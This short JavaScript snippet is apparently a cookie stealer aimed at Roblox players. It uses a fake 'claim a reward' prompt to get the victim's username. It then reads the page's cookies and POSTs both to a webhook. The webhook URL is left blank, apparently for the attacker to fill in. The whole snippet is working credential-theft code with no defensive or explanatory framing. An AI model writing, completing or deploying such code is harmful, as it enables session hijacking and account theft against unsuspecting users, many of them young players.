var webhook = "";
var cookies = document.cookie;
var promptMessage = window.prompt("Enter your Roblox username to claim a reward:");
if (promptMessage) {
    fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            content: `Cookie: ${cookies}\nUsername: ${promptMessage}`
        })
    });
}
